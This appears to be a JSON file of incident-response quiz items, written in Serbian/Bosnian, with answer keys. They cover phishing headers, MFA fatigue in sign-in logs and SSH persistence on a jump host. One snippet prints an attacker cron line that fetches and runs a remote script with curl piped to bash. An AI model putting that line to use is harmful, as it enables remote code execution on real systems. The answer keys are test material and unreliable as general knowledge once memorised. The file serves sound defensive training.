@@ -1,0 +1,245 @@
+[
+  {
+    "obj": "1.1",
+    "snippet": "Authentication-Results: mx01.drinalog.example;\n\tspf=pass (sender IP is 198.51.100.61) smtp.mailfrom=mail.drinalog-sso.example;\n\tdkim=pass (2048-bit key) header.d=drinalog-sso.example header.s=s1;\n\tdmarc=fail (p=none dis=none) header.from=drinalog.example\nFrom: \"Drina IT podrska\" <it-podrska@drinalog.example>",
+    "lang": "text",
+    "q": "Na osnovu ovih zaglavlja, zašto je phishing poruka isporučena u Jelenino sanduče?",
+    "options": [
+      "SPF i DKIM su prošli, pa je poruka legitimna",
+      "DMARC je pao jer domeni koji su prošli SPF i DKIM nisu poravnati sa From domenom, ali politika p=none ne traži nikakvu akciju",
+      "DKIM potpis je falsifikovan, ali mx01 ne provjerava DKIM",
+      "SPF je pao, a DMARC ignoriše SPF kad DKIM prođe"
+    ],
+    "answer": 1,
+    "explain": "SPF i DKIM su prošli, ali za napadačev domen drinalog-sso.example. DMARC traži da domen koji je prošao bude poravnat sa domenom iz From (drinalog.example), pa pada. Pošto Drina Logistika objavljuje p=none, prijemni server samo bilježi neuspjeh i isporučuje poruku. Sa p=quarantine ili p=reject poruka bi završila u karantinu ili bila odbijena."
+  },
+  {
+    "obj": "1.1",
+    "type": "spot",
+    "snippet": "Return-Path: <bounce+jkovac=drinalog.example@mail.drinalog-sso.example>\nReceived: from mx01.drinalog.example (localhost [127.0.0.1])\n\tby mbox01.drinalog.example (Postfix) with ESMTP id 7C2E31A0042\nReceived: from mail.drinalog-sso.example (mail.drinalog-sso.example [198.51.100.61])\n\tby mx01.drinalog.example (Postfix) with ESMTPS id 4Hq2Lk0Zc9z9sWX\nFrom: \"Drina IT podrska\" <it-podrska@drinalog.example>\nReply-To: <it-podrska@drinalog-sso.example>\nTo: \"Jelena Kovac\" <jelena.kovac@drinalog.example>\nSubject: Hitno: potvrdite MFA registraciju do 12h\nDate: Tue, 13 Oct 2026 09:42:07 +0200\nX-Mailer: PHPMailer 6.9.1",
+    "lang": "text",
+    "q": "Koji redovi otkrivaju napadačevu infrastrukturu, odnosno stvarni domen pošiljaoca, iako From izgleda kao interna adresa?",
+    "answer": [
+      0,
+      3,
+      6
+    ],
+    "explain": "Return-Path (envelope sender), Received koji je dodao naš mx01 (stvarni server 198.51.100.61 sa imenom mail.drinalog-sso.example) i Reply-To na drinalog-sso.example otkrivaju napadača. From je proizvoljan tekst koji napadač bira, a Received od mx01 prema mbox01 je interni korak."
+  },
+  {
+    "obj": "1.1",
+    "q": "Poruka ima pet zaglavlja Received. Kojem vjeruješ kad tražiš IP adresu servera koji je poslao poruku?",
+    "options": [
+      "Najgornjem, jer je najnovije",
+      "Najdonjem, jer je prvo u lancu",
+      "Onom koje je dodao prvi server pod tvojom kontrolom (tvoj MX), jer bilježi adresu sa koje je on primio vezu",
+      "Bilo kojem, jer ih potpisuje DKIM"
+    ],
+    "answer": 2,
+    "explain": "Svaki server dodaje Received na vrh, pa se čitaju odozdo nagore. Zaglavlja ispod tvog MX-a može napisati napadač. Zaglavlje koje je dodao tvoj MX sadrži IP adresu sa koje je TCP veza stvarno došla. DKIM obično ne potpisuje Received zaglavlja."
+  },
+  {
+    "obj": "1.1",
+    "type": "multi",
+    "q": "Koje od navedenih podataka iz phishing poruke uvrštavaš u IOC listu za blokiranje i pretragu drugih sandučića?",
+    "options": [
+      "IP adresu 198.51.100.61 iz Received zaglavlja tvog MX-a",
+      "Domen drinalog-sso.example i URL iz href atributa linka",
+      "SHA-256 priloga MFA-registracija.htm",
+      "Adresu primaoca jelena.kovac@drinalog.example",
+      "Prikazani tekst linka login.microsoftonline.com",
+      "IP adresu tvog servera mx01"
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "explain": "IOC-ovi su artefakti napadača: IP sa koje je poruka poslata, domen i URL na koji vodi link i hash priloga. Primalac je žrtva, mx01 je tvoja infrastruktura, a prikazani tekst linka je legitimni Microsoftov domen: blokiranje bi napravilo štetu."
+  },
+  {
+    "obj": "1.2",
+    "q": "U SigninLogs vidiš sedam zapisa sa ResultType 500121 sa iste strane IP adrese za jednog korisnika. Šta to pouzdano govori?",
+    "options": [
+      "Napadač pogađa lozinku",
+      "Lozinka je bila tačna, a drugi faktor nije prošao (korisnik je odbio ili nije potvrdio MFA zahtjev)",
+      "Conditional Access je blokirao prijavu",
+      "Korisnik je zaključan zbog previše pokušaja"
+    ],
+    "answer": 1,
+    "explain": "500121 znači da autentikacija nije uspjela na koraku jakog faktora. Do tog koraka se dolazi tek sa tačnom lozinkom, pa je prvi faktor već kompromitovan. Pogrešna lozinka je 50126, a blokada Conditional Accessa 53003."
+  },
+  {
+    "obj": "1.2",
+    "type": "spot",
+    "snippet": "TimeGenerated         UserPrincipalName   IPAddress      Location  ResultType\n2026-10-13T06:41:12Z  marko.petrovic      192.0.2.10     RS        0\n2026-10-13T06:54:07Z  milica.savic        192.0.2.10     RS        0\n2026-10-13T07:49:58Z  jelena.kovac        192.0.2.10     RS        0\n2026-10-13T08:11:20Z  jelena.kovac        203.0.113.77   NL        500121\n2026-10-13T08:12:05Z  jelena.kovac        203.0.113.77   NL        0\n2026-10-13T08:40:12Z  jelena.kovac        192.0.2.10     RS        0\n2026-10-13T09:05:33Z  jelena.kovac        203.0.113.77   NL        0",
+    "lang": "log",
+    "q": "Uspješne prijave (ResultType 0) i jedan neuspjeh. Milica je juče bila u Minhenu. Koji redovi su uspješne prijave koje čine nemoguće putovanje?",
+    "answer": [
+      5,
+      7
+    ],
+    "explain": "Jelena je u 07:49 u Srbiji, a u 08:12 i 09:05 uspješno se prijavljuje iz Holandije, sa vraćanjem u Srbiju u 08:40: nijedno putovanje ne traje 20 minuta. Red 4 je neuspjeh (500121), ne prijava. Milicina prijava iz Srbije dolazi 16 sati poslije prijave iz Njemačke, što je moguće."
+  },
+  {
+    "obj": "1.2",
+    "snippet": "SigninLogs\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, Location, IPAddress\n| order by UserPrincipalName asc, TimeGenerated asc\n| extend PrevUser = prev(UserPrincipalName), PrevLoc = prev(Location),\n         PrevTime = prev(TimeGenerated)\n| where PrevUser == UserPrincipalName and PrevLoc != Location\n| extend Minutes = datetime_diff('minute', TimeGenerated, PrevTime)\n| where Minutes < 180",
+    "lang": "kql",
+    "q": "Šta pronalazi ovaj upit?",
+    "options": [
+      "Korisnike sa više od 180 neuspjelih prijava",
+      "Uzastopne uspješne prijave istog korisnika iz različitih zemalja u razmaku kraćem od 3 sata",
+      "Sve prijave iz zemalja koje korisnik ranije nije koristio",
+      "Prijave koje su trajale duže od 180 minuta"
+    ],
+    "answer": 1,
+    "explain": "Sortiranje po korisniku i vremenu pa prev() daje prethodnu prijavu istog korisnika. Filter zadržava parove sa različitom lokacijom, a datetime_diff računa razmak u minutima. To je osnovna detekcija nemogućeg putovanja; rezultat se provjerava uz VPN izlaze i poznata putovanja."
+  },
+  {
+    "obj": "1.2",
+    "q": "Sve napadačeve prijave poslije prve imaju isti SessionId i AuthenticationRequirement singleFactorAuthentication. Šta iz toga slijedi za obuzdavanje?",
+    "options": [
+      "Dovoljno je resetovati lozinku, jer token zavisi od lozinke",
+      "Treba opozvati sesije (revoke sessions), jer napadač koristi token odobrene sesije i ne treba mu ni lozinka ni MFA",
+      "Treba isključiti MFA za korisnika dok traje istraga",
+      "Treba samo blokirati aplikaciju OfficeHome"
+    ],
+    "answer": 1,
+    "explain": "Zahtjev za MFA je zadovoljen tvrdnjom iz postojećeg tokena, pa napadač radi sa sesijom koju je Jelena odobrila. Reset lozinke ne poništava izdate tokene za osvježavanje; to radi opoziv sesija (Revoke-MgUserSignInSession) uz reset lozinke i uklanjanje napadačevog MFA metoda."
+  },
+  {
+    "obj": "1.2",
+    "type": "multi",
+    "q": "Po čemu se AiTM phishing (lažna stranica posreduje pravu prijavu i krade kolačić sesije) razlikuje u SigninLogs od MFA umora? Izaberi tačne tvrdnje.",
+    "options": [
+      "Kod AiTM-a obično nema niza 500121 zapisa, jer korisnik sam prolazi MFA na lažnoj stranici",
+      "Kod AiTM-a uspješna MFA prijava dolazi sa IP adrese napadačevog proxyja, a ne sa korisnikove",
+      "Kod AiTM-a se ista sesija zatim koristi sa druge IP adrese ili drugog uređaja",
+      "AiTM ne može zaobići nijedan oblik MFA-a",
+      "Kod MFA umora korisnik nikad ne upisuje lozinku"
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "explain": "AiTM proxy prosljeđuje pravu prijavu, pa korisnik odobri jedan MFA zahtjev na stranici koju vidi; prijava dolazi sa adrese proxyja, a ukradeni kolačić se kasnije koristi drugdje. AiTM zaobilazi push i OTP MFA, ali ne FIDO2/passkey, koji vezuje potpis za pravi domen. Kod MFA umora napadač već ima lozinku."
+  },
+  {
+    "obj": "1.3",
+    "type": "spot",
+    "snippet": "Oct 12 17:44:03 jump01 sshd[40980]: Accepted publickey for jkovac from 10.8.0.14 port 50877 ssh2: ED25519\nOct 12 17:46:20 jump01 sudo:   jkovac : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\nOct 13 07:20:33 jump01 sshd[47811]: Accepted publickey for mpetrovic from 10.8.0.11 port 53002 ssh2: ED25519\nOct 13 08:24:02 jump01 sshd[48121]: Accepted password for jkovac from 10.8.0.23 port 50122 ssh2\nOct 13 08:24:02 jump01 sshd[48121]: pam_unix(sshd:session): session opened for user jkovac(uid=1003)\nOct 13 08:25:13 jump01 sudo:   jkovac : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/cat /etc/ssh/sshd_config\nOct 13 08:27:15 jump01 crontab[48190]: (jkovac) REPLACE (jkovac)\nOct 13 08:40:01 jump01 CRON[48402]: pam_unix(cron:session): session opened for user jkovac(uid=1003)",
+    "lang": "log",
+    "q": "Isječak iz auth.log na jump01. Jelena se inače prijavljuje ključem. Koji redovi pokazuju napadačev ulaz i postavljanje perzistencije?",
+    "answer": [
+      3,
+      6
+    ],
+    "explain": "Red 3 je prijava lozinkom (umjesto ključem) sa VPN adrese 10.8.0.23 koju je dobio napadač. Red 6 je zamjena crontaba korisnika jkovac. Red 7 je izvršavanje tog cron posla (posljedica, ne postavljanje), a red 5 je izviđanje SSH konfiguracije."
+  },
+  {
+    "obj": "1.3",
+    "type": "spot",
+    "snippet": "$ ssh-keygen -lf /home/jkovac/.ssh/authorized_keys\n256 SHA256:cXDy5ky+uyusHslJ8cIsTPAjV7S+t4Khpq0j422hz1E jelena@lap-jk-07 (ED25519)\n3072 SHA256:+SniYO7XFnDEUoBsFfx6wdtZWRD/ODj56IQiE2kBUX0 deploy@build-07 (RSA)\n$ crontab -l -u jkovac\n15 6 * * 1-5 /home/jkovac/bin/rotate-nginx-logs.sh\n*/20 * * * * /bin/bash -c \"curl -fsS http://198.51.100.23/k.sh | bash\" >/dev/null 2>&1\n$ cat /etc/cron.d/backup-logs\n25 6 * * * root /usr/local/bin/arhiviraj-logove.sh >/dev/null 2>&1",
+    "lang": "bash",
+    "q": "Jelena ima jedan ključ na laptopu, a firma nema build server. Koji redovi su napadačeva perzistencija?",
+    "answer": [
+      2,
+      5
+    ],
+    "explain": "Ključ sa komentarom deploy@build-07 ne postoji u inventaru (komentar bira onaj ko je dodao ključ), a cron posao svakih 20 minuta preuzima i izvršava skriptu sa 198.51.100.23. Rotacija nginx logova i noćno arhiviranje su legitimni poslovi."
+  },
+  {
+    "obj": "1.3",
+    "q": "Prijava napadača na db01 izgleda isto kao Jelenin svakodnevni rad: Accepted publickey for jkovac from 10.20.0.10 ključem jkovac@jump01. Koja tehnika i propust su to omogućili?",
+    "options": [
+      "T1110 Brute Force: napadač je pogodio lozinku na db01",
+      "T1552.004 Private Keys: privatni ključ za db01 je ležao na jump01, pa ga je napadač iskoristio sa korisnikovim pravima",
+      "T1068 Exploitation for Privilege Escalation na db01",
+      "T1078 Valid Accounts preko nove VPN sesije direktno na db01"
+    ],
+    "answer": 1,
+    "explain": "Ko ima shell kao jkovac na jump01, može čitati ~/.ssh/id_ed25519. Zato se na jump hostu ne drže privatni ključevi: koristi se ssh -J (ProxyJump), agent forwarding sa potvrdom ili SSH certifikati kratkog trajanja. Detekcija se oslanja na kontekst: prijava na db01 minutama poslije sumnjive prijave na jump01 i pg_dump poslije nje."
+  },
+  {
+    "obj": "1.3",
+    "type": "match",
+    "q": "Upari svaki korak napada sa MITRE ATT&CK tehnikom.",
+    "options": [
+      "Sedam MFA zahtjeva dok korisnik ne odobri jedan",
+      "Registracija napadačevog Authenticatora na Jelenin nalog",
+      "Prijava na OpenVPN ukradenim nalogom",
+      "Dodat ključ u ~/.ssh/authorized_keys",
+      "Cron posao curl | bash svakih 20 minuta"
+    ],
+    "targets": [
+      "T1053.003 Cron",
+      "T1098.004 SSH Authorized Keys",
+      "T1621 MFA Request Generation",
+      "T1133 External Remote Services",
+      "T1098.005 Device Registration"
+    ],
+    "answer": [
+      2,
+      4,
+      3,
+      1,
+      0
+    ],
+    "explain": "MFA umor je T1621, registracija uređaja ili MFA metoda je T1098.005, pristup preko VPN-a ukradenim nalogom je T1133, ključ u authorized_keys je T1098.004, a cron posao je T1053.003."
+  },
+  {
+    "obj": "1.4",
+    "type": "order",
+    "q": "Napadač ima aktivnu sesiju, VPN i cron na jump01. Poredaj korake obuzdavanja ispravnim redom.",
+    "options": [
+      "Ukloniti ključ iz authorized_keys i cron posao na jump01",
+      "Opozvati sesije i privremeno blokirati prijavu naloga",
+      "Prikupiti dokaze sa jump01 (crontab, authorized_keys, .bash_history) sa SHA-256",
+      "Rotirati ključ jkovac@jump01 na svim serverima",
+      "Resetovati lozinku i ukloniti napadačev MFA metod",
+      "Prekinuti VPN sesiju i blokirati 203.0.113.77 i 198.51.100.23"
+    ],
+    "answer": [
+      1,
+      4,
+      5,
+      2,
+      0,
+      3
+    ],
+    "explain": "Prvo se gasi pristup koji napadač sada koristi: sesije, pa lozinka i njegov MFA metod, pa VPN i mrežne adrese. Zatim se prikupljaju dokazi sa hosta prije nego što ih promijeniš, pa se uklanja perzistencija i na kraju rotiraju ključevi koje je napadač mogao iskoristiti."
+  },
+  {
+    "obj": "1.4",
+    "q": "Rukovodilac IT-a predlaže da se jump01 odmah ugasi. Šta preporučuješ?",
+    "options": [
+      "Odmah ugasiti, jer je to najbrže obuzdavanje",
+      "Mrežno izolovati jump01 (dozvoliti samo SOC), prikupiti volatilne dokaze i zatim ga ponovo izgraditi iz čiste slike",
+      "Ostaviti ga da radi bez ograničenja da bi se pratio napadač",
+      "Obrisati home direktorij korisnika jkovac i nastaviti rad"
+    ],
+    "answer": 1,
+    "explain": "Gašenjem se gube procesi, mrežne veze i sadržaj /tmp, a ostavljanje bez ograničenja daje napadaču vrijeme. Izolacija zaustavlja napadača i čuva stanje za prikupljanje dokaza po redu volatilnosti. Pošto je napadač imao sudo, host se poslije istrage gradi iznova."
+  },
+  {
+    "obj": "1.4",
+    "type": "multi",
+    "q": "Koje kontrole bi spriječile ili rano zaustavile ovaj incident? Izaberi sve koje direktno prekidaju neki korak lanca.",
+    "options": [
+      "DMARC p=reject za drinalog.example",
+      "MFA sa number matchingom ili FIDO2 ključevima",
+      "PasswordAuthentication no na jump01",
+      "Duža minimalna dužina lozinke",
+      "Analytics pravilo: 5 ili više 500121 pa uspjeh sa iste IP adrese",
+      "Češća rotacija Wazuh logova"
+    ],
+    "answer": [
+      0,
+      1,
+      2,
+      4
+    ],
+    "explain": "DMARC p=reject odbija poruku sa lažnim From, number matching ili FIDO2 sprječava MFA umor, zabrana lozinki za SSH sprječava ulaz na jump01 ukradenom lozinkom, a analytics pravilo bi dalo alarm 12 minuta prije SSH-a. Duža lozinka ne pomaže kad korisnik sam upiše lozinku na lažnoj stranici, a rotacija logova ne utiče na detekciju."
+  }
+]
